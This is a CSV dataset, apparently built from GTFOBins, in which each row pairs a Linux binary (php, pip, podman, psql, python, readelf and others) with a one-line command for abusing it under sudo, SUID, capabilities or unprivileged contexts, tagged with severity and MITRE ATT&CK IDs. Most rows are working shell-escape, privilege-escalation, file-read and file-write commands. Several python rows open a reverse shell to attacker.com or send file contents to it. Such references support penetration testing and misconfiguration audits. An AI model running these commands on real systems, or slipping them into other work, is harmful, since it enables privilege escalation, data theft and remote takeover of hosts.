1328,Linux,"php -r 'passthru(""/bin/sh -i"");'",Abuse the 'php' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/php/
1329,Linux,"php -r 'posix_setuid(0); $h=@popen(""/bin/sh -i"",""r""); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'",Abuse the 'php' binary (shell) in a capabilities context to escalate privileges or execute arbitrary actions.,Capabilities Abuse,Critical,T1548.001,https://gtfobins.github.io/gtfobins/php/
1330,Linux,"php -r '$h=@popen(""/bin/sh -i"",""r""); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'",Abuse the 'php' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/php/
1331,Linux,"php -r '$h=@popen(""/bin/sh -i"",""r""); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'",Abuse the 'php' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/php/
1332,Linux,"php -r '$h=@popen(""/bin/sh -i"",""r""); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'",Abuse the 'php' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/php/
1333,Linux,"php -r 'posix_setuid(0); pcntl_exec(""/bin/sh"");'",Abuse the 'php' binary (shell) in a capabilities context to escalate privileges or execute arbitrary actions.,Capabilities Abuse,Critical,T1548.001,https://gtfobins.github.io/gtfobins/php/
1334,Linux,"php -r 'pcntl_exec(""/bin/sh"");'",Abuse the 'php' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/php/
1335,Linux,"php -r 'pcntl_exec(""/bin/sh"", [""-p""]);'",Abuse the 'php' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/php/
1336,Linux,"php -r 'pcntl_exec(""/bin/sh"");'",Abuse the 'php' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/php/
1337,Linux,php -S 0.0.0.0:80,Abuse the 'php' binary (upload) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/php/
1338,Linux,php -S 0.0.0.0:80,Abuse the 'php' binary (upload) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/php/
1339,Linux,php -S 0.0.0.0:80,Abuse the 'php' binary (upload) in a unprivileged context to escalate privileges or execute arbitrary actions.,File Upload,Medium,T1105,https://gtfobins.github.io/gtfobins/php/
1340,Linux,pic /path/to/input-file,Abuse the 'pic' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The output is prefixed with some content.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/pic/
1341,Linux,pic /path/to/input-file,Abuse the 'pic' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The output is prefixed with some content.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/pic/
1342,Linux,pic /path/to/input-file,Abuse the 'pic' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The output is prefixed with some content.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/pic/
1343,Linux,pic -U .PS sh X sh X,Abuse the 'pic' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/pic/
1344,Linux,pic -U .PS sh X sh X,Abuse the 'pic' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/pic/
1345,Linux,pic -U .PS sh X sh X,Abuse the 'pic' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/pic/
1346,Linux,pidstat -e /bin/sh,Abuse the 'pidstat' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/pidstat/
1347,Linux,pidstat -e /bin/sh -p,Abuse the 'pidstat' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/pidstat/
1348,Linux,pidstat -e /bin/sh,Abuse the 'pidstat' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/pidstat/
1349,Linux,echo '...' >setup.py pip install --break-system-packages .,"Abuse the 'pip' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions. This allows to run Python code (`...`). It executes a Python script named `setup.py` in the directory passed as argument (`.`). Keep in mind that the TTY is lost, so `/dev/tty` can be used, for example: ``` echo 'import os; os.system(""exec /bin/sh </dev/tty >/dev/tty 2>/dev/tty"")' >setup.py ``` The `--break-system-packages` flag can be omitted in older systems.",Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/pip/
1350,Linux,echo '...' >setup.py pip install --break-system-packages .,"Abuse the 'pip' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions. This allows to run Python code (`...`). It executes a Python script named `setup.py` in the directory passed as argument (`.`). Keep in mind that the TTY is lost, so `/dev/tty` can be used, for example: ``` echo 'import os; os.system(""exec /bin/sh </dev/tty >/dev/tty 2>/dev/tty"")' >setup.py ``` The `--break-system-packages` flag can be omitted in older systems.",Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/pip/
1351,Linux,pip config --editor '/bin/sh -s' edit,Abuse the 'pip' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/pip/
1352,Linux,pip config --editor '/bin/sh -s' edit,Abuse the 'pip' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/pip/
1353,Linux,echo '...' >/path/to/file.py pipx run /path/to/file.py,Abuse the 'pipx' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions. This allows to run Python code (`...`).,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/pipx/
1354,Linux,echo '...' >/path/to/file.py pipx run /path/to/file.py,Abuse the 'pipx' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions. This allows to run Python code (`...`).,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/pipx/
1355,Linux,pkexec /bin/sh,Abuse the 'pkexec' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/pkexec/
1356,Linux,pkg install -y --no-repo-update ./x-1.0.txz,Abuse the 'pkg' binary (command) in a sudo context to escalate privileges or execute arbitrary actions. Generate the FreeBSD package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target. ``` echo /path/to/command >x.sh fpm -n x -s dir -t freebsd -a all --before-install x.sh . ```,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/pkg/
1357,Linux,plymouth ask-for-password --prompt=x --command=/bin/sh,Abuse the 'plymouth' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/plymouth/
1358,Linux,plymouth ask-for-password --prompt=x --command='/bin/sh -p',Abuse the 'plymouth' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/plymouth/
1359,Linux,plymouth ask-for-password --prompt=x --command=/bin/sh,Abuse the 'plymouth' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/plymouth/
1360,Linux,podman run --rm -it --privileged --volume /:/mnt alpine chroot /mnt /bin/sh,"Abuse the 'podman' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. This requires an actual image to be available (e.g., `alpine`) downloading it if not present.",Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/podman/
1361,Linux,podman run --rm -it --privileged --volume /:/mnt alpine chroot /mnt /bin/sh,"Abuse the 'podman' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. This requires an actual image to be available (e.g., `alpine`) downloading it if not present.",Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/podman/
1362,Linux,echo '...' >/path/to/temp-file poetry run python /path/to/temp-file,"Abuse the 'poetry' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions. This allows to run Python code (`...`). A valid `pyproject.toml` file must be present in the current working directory, you can create one with `poetry init -n`.",Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/poetry/
1363,Linux,echo '...' >/path/to/temp-file poetry run python /path/to/temp-file,"Abuse the 'poetry' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions. This allows to run Python code (`...`). A valid `pyproject.toml` file must be present in the current working directory, you can create one with `poetry init -n`.",Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/poetry/
1364,Linux,posh,Abuse the 'posh' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/posh/
1365,Linux,posh,Abuse the 'posh' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/posh/
1366,Linux,pr -T /path/to/input-file,Abuse the 'pr' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/pr/
1367,Linux,pr -T /path/to/input-file,Abuse the 'pr' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/pr/
1368,Linux,pr -T /path/to/input-file,Abuse the 'pr' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/pr/
1369,Linux,echo -e ':0\n| /path/to/command >/path/to/temp-file procmail -m /path/to/temp-file,"Abuse the 'procmail' binary (command) in a sudo context to escalate privileges or execute arbitrary actions. The program is picky about the file ownership, and waits for some input.",Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/procmail/
1370,Linux,echo -e ':0\n| /path/to/command >/path/to/temp-file procmail -m /path/to/temp-file,"Abuse the 'procmail' binary (command) in a unprivileged context to escalate privileges or execute arbitrary actions. The program is picky about the file ownership, and waits for some input.",Arbitrary Command Execution,High,T1059,https://gtfobins.github.io/gtfobins/procmail/
1371,Linux,pry,Abuse the 'pry' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/pry/
1372,Linux,pry,Abuse the 'pry' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions.,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/pry/
1373,Linux,psftp !/bin/sh,Abuse the 'psftp' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/psftp/
1374,Linux,psftp !/bin/sh,Abuse the 'psftp' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/psftp/
1375,Linux,psftp !/bin/sh,Abuse the 'psftp' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/psftp/
1376,Linux,psql \?,Abuse the 'psql' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/psql/
1377,Linux,psql \?,Abuse the 'psql' binary (inherit) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/psql/
1378,Linux,psql \?,Abuse the 'psql' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions.,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/psql/
1379,Linux,psql \! /bin/sh,Abuse the 'psql' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/psql/
1380,Linux,psql \! /bin/sh,Abuse the 'psql' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/psql/
1381,Linux,psql \! /bin/sh,Abuse the 'psql' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/psql/
1382,Linux,ptx -w 999 /path/to/input-file,Abuse the 'ptx' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/ptx/
1383,Linux,ptx -w 999 /path/to/input-file,Abuse the 'ptx' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/ptx/
1384,Linux,ptx -w 999 /path/to/input-file,Abuse the 'ptx' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/ptx/
1385,Linux,puppet filebucket -l diff /dev/null /path/to/input-file,Abuse the 'puppet' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The read file content is corrupted by the `diff` output format. The actual `diff` command is executed.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/puppet/
1386,Linux,puppet filebucket -l diff /dev/null /path/to/input-file,Abuse the 'puppet' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The read file content is corrupted by the `diff` output format. The actual `diff` command is executed.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/puppet/
1387,Linux,"puppet apply -e 'file { ""/path/to/output-file"": content => ""DATA"" }'",Abuse the 'puppet' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/puppet/
1388,Linux,"puppet apply -e 'file { ""/path/to/output-file"": content => ""DATA"" }'",Abuse the 'puppet' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/puppet/
1389,Linux,"puppet apply -e ""exec { '/bin/sh <$(tty) >$(tty) 2>$(tty)': }""",Abuse the 'puppet' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/puppet/
1390,Linux,"puppet apply -e ""exec { '/bin/sh <$(tty) >$(tty) 2>$(tty)': }""",Abuse the 'puppet' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/puppet/
1391,Linux,"pwsh -c '""DATA"" | Out-File /path/to/output-file'",Abuse the 'pwsh' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/pwsh/
1392,Linux,"pwsh -c '""DATA"" | Out-File /path/to/output-file'",Abuse the 'pwsh' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/pwsh/
1393,Linux,pwsh,Abuse the 'pwsh' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/pwsh/
1394,Linux,pwsh,Abuse the 'pwsh' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/pwsh/
1395,Linux,pygmentize -l text /path/to/input-file,Abuse the 'pygmentize' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/pygmentize/
1396,Linux,pygmentize -l text /path/to/input-file,Abuse the 'pygmentize' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/pygmentize/
1397,Linux,pyright /path/to/input-file,Abuse the 'pyright' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. Content is leaked as error messages.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/pyright/
1398,Linux,pyright /path/to/input-file,Abuse the 'pyright' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. Content is leaked as error messages.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/pyright/
1399,Linux,pyright --outputjson /path/to/input-file,Abuse the 'pyright' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. Content is leaked as error messages in JSON format.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/pyright/
1400,Linux,pyright --outputjson /path/to/input-file,Abuse the 'pyright' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. Content is leaked as error messages in JSON format.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/pyright/
1401,Linux,pyright -w /path/to/input-dir/,"Abuse the 'pyright' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. Recursively walks directories, parsing all Python files and leaking some contents through diagnostics.",Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/pyright/
1402,Linux,pyright -w /path/to/input-dir/,"Abuse the 'pyright' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. Recursively walks directories, parsing all Python files and leaking some contents through diagnostics.",Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/pyright/
1403,Linux,"python -c 'import sys; from os import environ as e if sys.version_info.major == 3: import urllib.request as r else: import urllib as r r.urlretrieve(""http://attacker.com/path/to/input-file"", ""/path/to/output-file"")'",Abuse the 'python' binary (download) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/python/
1404,Linux,"python -c 'import sys; from os import environ as e if sys.version_info.major == 3: import urllib.request as r else: import urllib as r r.urlretrieve(""http://attacker.com/path/to/input-file"", ""/path/to/output-file"")'",Abuse the 'python' binary (download) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/python/
1405,Linux,"python -c 'import sys; from os import environ as e if sys.version_info.major == 3: import urllib.request as r else: import urllib as r r.urlretrieve(""http://attacker.com/path/to/input-file"", ""/path/to/output-file"")'",Abuse the 'python' binary (download) in a unprivileged context to escalate privileges or execute arbitrary actions.,File Download,Low,T1105,https://gtfobins.github.io/gtfobins/python/
1406,Linux,"python -c 'print(open(""/path/to/input-file"").read())'",Abuse the 'python' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/python/
1407,Linux,"python -c 'print(open(""/path/to/input-file"").read())'",Abuse the 'python' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/python/
1408,Linux,"python -c 'print(open(""/path/to/input-file"").read())'",Abuse the 'python' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/python/
1409,Linux,"python -c 'open(""/path/to/output-file"",""w+"").write(""DATA"")'",Abuse the 'python' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/python/
1410,Linux,"python -c 'open(""/path/to/output-file"",""w+"").write(""DATA"")'",Abuse the 'python' binary (file write) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/python/
1411,Linux,"python -c 'open(""/path/to/output-file"",""w+"").write(""DATA"")'",Abuse the 'python' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/python/
1412,Linux,"python -c 'from ctypes import cdll; cdll.LoadLibrary(""/path/to/lib.so"")'",Abuse the 'python' binary (library load) in a capabilities context to escalate privileges or execute arbitrary actions.,Capabilities Abuse,High,T1548.001,https://gtfobins.github.io/gtfobins/python/
1413,Linux,"python -c 'from ctypes import cdll; cdll.LoadLibrary(""/path/to/lib.so"")'",Abuse the 'python' binary (library load) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/python/
1414,Linux,"python -c 'from ctypes import cdll; cdll.LoadLibrary(""/path/to/lib.so"")'",Abuse the 'python' binary (library load) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/python/
1415,Linux,"python -c 'from ctypes import cdll; cdll.LoadLibrary(""/path/to/lib.so"")'",Abuse the 'python' binary (library load) in a unprivileged context to escalate privileges or execute arbitrary actions.,Library Load Hijack,Medium,T1574.006,https://gtfobins.github.io/gtfobins/python/
1416,Linux,"python -c 'import sys,socket,os,pty;s=socket.socket() s.connect((""attacker.com"",12345)) [os.dup2(s.fileno(),fd) for fd in (0,1,2)] pty.spawn(""/bin/sh"")'",Abuse the 'python' binary (reverse shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/python/
1417,Linux,"python -c 'import sys,socket,os,pty;s=socket.socket() s.connect((""attacker.com"",12345)) [os.dup2(s.fileno(),fd) for fd in (0,1,2)] pty.spawn(""/bin/sh"")'",Abuse the 'python' binary (reverse shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/python/
1418,Linux,"python -c 'import sys,socket,os,pty;s=socket.socket() s.connect((""attacker.com"",12345)) [os.dup2(s.fileno(),fd) for fd in (0,1,2)] pty.spawn(""/bin/sh"")'",Abuse the 'python' binary (reverse shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Reverse Shell,High,T1059,https://gtfobins.github.io/gtfobins/python/
1419,Linux,"python -c 'import os; os.setuid(0); os.execl(""/bin/sh"", ""sh"")'",Abuse the 'python' binary (shell) in a capabilities context to escalate privileges or execute arbitrary actions.,Capabilities Abuse,Critical,T1548.001,https://gtfobins.github.io/gtfobins/python/
1420,Linux,"python -c 'import os; os.execl(""/bin/sh"", ""sh"")'",Abuse the 'python' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/python/
1421,Linux,"python -c 'import os; os.execl(""/bin/sh"", ""sh"", ""-p"")'",Abuse the 'python' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/python/
1422,Linux,"python -c 'import os; os.execl(""/bin/sh"", ""sh"")'",Abuse the 'python' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/python/
1423,Linux,"python -c 'import sys if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u else: import urllib as u, urllib2 as r r.urlopen(""http://attacker.com"", open(""/path/to/input-file"", ""rb"").read())'",Abuse the 'python' binary (upload) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/python/
1424,Linux,"python -c 'import sys if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u else: import urllib as u, urllib2 as r r.urlopen(""http://attacker.com"", open(""/path/to/input-file"", ""rb"").read())'",Abuse the 'python' binary (upload) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/python/
1425,Linux,"python -c 'import sys if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u else: import urllib as u, urllib2 as r r.urlopen(""http://attacker.com"", open(""/path/to/input-file"", ""rb"").read())'",Abuse the 'python' binary (upload) in a unprivileged context to escalate privileges or execute arbitrary actions.,File Upload,Medium,T1105,https://gtfobins.github.io/gtfobins/python/
1426,Linux,"python -c 'import sys if sys.version_info.major == 3: import http.server as s, socketserver as ss else: import SimpleHTTPServer as s, SocketServer as ss ss.TCPServer(("""", 12345), s.SimpleHTTPRequestHandler).serve_forever()'",Abuse the 'python' binary (upload) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/python/
1427,Linux,"python -c 'import sys if sys.version_info.major == 3: import http.server as s, socketserver as ss else: import SimpleHTTPServer as s, SocketServer as ss ss.TCPServer(("""", 12345), s.SimpleHTTPRequestHandler).serve_forever()'",Abuse the 'python' binary (upload) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/python/
1428,Linux,"python -c 'import sys if sys.version_info.major == 3: import http.server as s, socketserver as ss else: import SimpleHTTPServer as s, SocketServer as ss ss.TCPServer(("""", 12345), s.SimpleHTTPRequestHandler).serve_forever()'",Abuse the 'python' binary (upload) in a unprivileged context to escalate privileges or execute arbitrary actions.,File Upload,Medium,T1105,https://gtfobins.github.io/gtfobins/python/
1429,Linux,qpdf --empty --add-attachment /path/to/input-file --key=x -- /path/to/output-file qpdf --show-attachment=x /path/to/output-file,Abuse the 'qpdf' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/qpdf/
1430,Linux,qpdf --empty --add-attachment /path/to/input-file --key=x -- /path/to/output-file qpdf --show-attachment=x /path/to/output-file,Abuse the 'qpdf' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/qpdf/
1431,Linux,qpdf --empty --add-attachment /path/to/input-file --key=x -- /path/to/output-file qpdf --show-attachment=x /path/to/output-file,Abuse the 'qpdf' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/qpdf/
1432,Linux,rake -f /path/to/input-file,Abuse the 'rake' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The file is actually parsed and the first wrong line is returned in an error message.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/rake/
1433,Linux,rake -f /path/to/input-file,Abuse the 'rake' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The file is actually parsed and the first wrong line is returned in an error message.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/rake/
1434,Linux,rake -p '...',Abuse the 'rake' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions. This allows to run Ruby code (`...`).,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/rake/
1435,Linux,rake -p '...',Abuse the 'rake' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions. This allows to run Ruby code (`...`).,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/rake/
1436,Linux,ranger S,Abuse the 'ranger' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/ranger/
1437,Linux,ranger S,Abuse the 'ranger' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/ranger/
1438,Linux,rc,Abuse the 'rc' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/rc/
1439,Linux,rc,Abuse the 'rc' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/rc/
1440,Linux,rc,Abuse the 'rc' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/rc/
1441,Linux,readelf -a @/path/to/input-file,Abuse the 'readelf' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. Each line is corrupted by a prefix string and wrapped inside single quotes. Also consider that lines are actually parsed as `readelf` options thus some file contents may lead to unexpected results.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/readelf/
1442,Linux,readelf -a @/path/to/input-file,Abuse the 'readelf' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. Each line is corrupted by a prefix string and wrapped inside single quotes. Also consider that lines are actually parsed as `readelf` options thus some file contents may lead to unexpected results.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/readelf/
1443,Linux,readelf -a @/path/to/input-file,Abuse the 'readelf' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. Each line is corrupted by a prefix string and wrapped inside single quotes. Also consider that lines are actually parsed as `readelf` options thus some file contents may lead to unexpected results.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/readelf/
